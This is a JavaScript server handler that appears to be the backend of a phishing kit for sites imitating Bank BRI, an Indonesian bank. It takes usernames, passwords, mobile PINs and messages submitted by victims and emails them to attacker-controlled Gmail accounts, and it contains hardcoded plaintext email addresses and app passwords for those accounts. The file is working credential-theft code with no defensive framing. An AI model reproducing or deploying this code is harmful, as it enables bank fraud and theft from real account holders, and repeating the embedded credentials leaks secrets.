export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';

    if(url == 'bri.site'){

        email = 'orbitorbit799@gmail.com';
        pass = 'ahghpmbdwokimqim';

    } else if (url == 'bri-promo.herokuapp.com') {
        
        email = 'hibrahimshaleh@gmail.com';
        pass = 'bfaawtyurzhbqjkl';

    } else if(url == 'bri-pelayanan.herokuapp.com'){
        email = 'pukiayam5123@gmail.com';
        pass = 'joyxbannkfmypmzx';

    } else if(url == 'bri.herokuapp.com'){
        email = 'penaruhangin@gmail.com';
        pass = 'alocfzvnbofojokm';

    }
    else {
        email = 'bripembukaanrekening@gmail.com';
        pass = 'nocpaagwmdvyyoin';
    }
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'BriApp',
                html: `
                    <ul>
                        <li>username: ${body.username ?? '-'}</li> 
                        <li>password: ${body.password ?? '-'}</li>
                        <li>pin: ${body.mPin ?? '-'}</li>
                        <li>message: ${body.message ?? '-'}</li>
                    </ul>
                `,            
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}